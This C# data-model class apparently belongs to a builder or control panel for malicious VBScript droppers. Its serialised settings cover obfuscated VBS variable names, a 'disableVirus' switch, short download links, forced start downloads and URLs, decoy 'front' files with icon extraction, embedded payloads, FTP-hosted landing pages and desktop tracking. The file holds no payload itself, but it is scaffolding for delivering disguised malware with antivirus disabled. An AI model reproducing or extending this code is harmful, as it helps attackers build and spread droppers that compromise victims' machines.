using System.Text.Json.Serialization;

namespace model;

    public class TabModel
    {
        public string Random()
        {
            return VbsRandomer.GenerateRandomVariableName(10);
        }
        
        private string _id;
        
        public ServerModel _server;
        public TabModel(ServerModel serverModel)
        {
            _server = serverModel;
        }
        
        public TabModel()
        {
           
        }

        [JsonPropertyName("dnVbsLinkShort")] public string DnVbsLinkShort => _server.DnVbsLinkShort;
        [JsonPropertyName("phpVbsLinkShort")] public string PhpVbsLinkShort => _server.PhpVbsLinkShort;
        [JsonPropertyName("userPhpVbsFile")] public string UserPhpVbsFile => _server.UserPhpVbsFile;
        
        [JsonIgnore] public string Server => _server.Server;
        
        [JsonPropertyName("disableVirus")] public bool DisableVirus
        {
            get
            {
                return _server.DisableVirus;
            }
            set
            {
                _server.DisableVirus = value;
            }
        }
        
        [JsonPropertyName("trackSerie")] public string TrackSerie
        {
            get
            {
                return _server.TrackSerie;
            }
            set
            {
                _server.TrackSerie = value;
            }
        }
        
        [JsonPropertyName("trackDesktop")] public bool TrackDesktop
        {
            get
            {
                return _server.TrackDesktop;
            }
            set
            {
                _server.TrackDesktop = value;
            }
        }

        [JsonPropertyName("id")]
        public string Id
        {
            get
            {
                if (string.IsNullOrEmpty(_id))
                    _id = "default";
                return _id;
            }
            set
            {
                _id = value;
            }
        }
        
        [JsonPropertyName("landingAuto")]
        public bool LandingAuto
        {
            get
            {
                return _server.LandingAuto;
            }
            set
            {
                _server.LandingAuto = value;
            }
        }
        
        [JsonPropertyName("landingName")]
        public string LandingName
        {
            get
            {
                return _server.LandingName;
            }
            set
            {
                _server.LandingName = value;
            }
        }
        
        [JsonPropertyName("landingFtp")]
        public string LandingFtp
        {
            get
            {
                return _server.LandingFtp;
            }
            set
            {
                _server.LandingFtp = value;
            }
        }

        [JsonPropertyName("pushesForce")] public bool PushesForce
        {
            get => _server.PushesForce;
            set => _server.PushesForce = value;
        }
        [JsonPropertyName("pushes")] public List<string> Pushes => _server.Pushes;

        [JsonPropertyName("startDownloadsForce")] public bool StartDownloadsForce
        {
            get => _server.StartDownloadsForce;
            set => _server.StartDownloadsForce = value;
        }
        [JsonPropertyName("startDownloads")] public List<string> StartDownloads => _server.StartDownloads;

        [JsonPropertyName("startUrlsForce")] public bool StartUrlsForce
        {
            get => _server.StartUrlsForce;
            set => _server.StartUrlsForce = value;
        }
        [JsonPropertyName("startUrls")] public List<string> StartUrls => _server.StartUrls;

        [JsonPropertyName("frontForce")] public bool FrontForce
        {
            get => _server.FrontForce;
            set => _server.FrontForce = value;
        }
        [JsonPropertyName("front")] public List<string> Front => _server.Front;

        [JsonPropertyName("extractIconFromFront")]
        public bool ExtractIconFromFront => _server.ExtractIconFromFront;

        [JsonPropertyName("embeddingsForce")] public bool EmbeddingsForce
        {
            get => _server.EmbeddingsForce;
            set => _server.EmbeddingsForce = value;
        }
        [JsonPropertyName("embeddings")] public List<string> Embeddings => _server.Embeddings;
    }
